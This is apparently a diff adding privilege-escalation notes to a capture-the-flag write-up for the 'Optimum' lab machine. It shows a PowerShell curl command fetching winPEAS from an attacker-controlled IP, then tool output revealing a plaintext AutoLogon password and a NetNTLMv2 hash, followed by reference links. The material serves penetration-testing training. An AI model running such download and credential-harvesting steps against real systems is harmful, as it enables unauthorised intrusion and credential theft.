@@ -36,3 +36,16 @@ type user.txt.txt
 d0c39409d7b994a9a1389ebf38ef5f73
 
 ============================Priv Escalation=====================================
+C:\Users\kostas\Desktop>powershell -c "curl http://10.10.14.18/winPEASx64.exe -OutFile winPEASx64.exe"
+[+] Looking for AutoLogon credentials
+   Some AutoLogon credentials were found
+   DefaultUserName               :  kostas
+   DefaultPassword               :  kdeEjDowkS*
+    
+ [+] Enumerating Security Packages Credentials
+ Version: NetNTLMv2
+ Hash:    kostas::OPTIMUM:1122334455667788:35bf825ac284258ee284b4f3e8a71a7e:010100000000000021c6cf42d74bd701b46cffc769d2399d0000000008003000300000000000000000000000002000001271fbffa75b0234e6552fbcdf6a2f6bbcb5ae490daa6b7c3f402870fb42c2cc0a00100000000000000000000000000000000000090000000000000000000000
+
+References:
+https://nullarmor.github.io/posts/optimum
+https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/
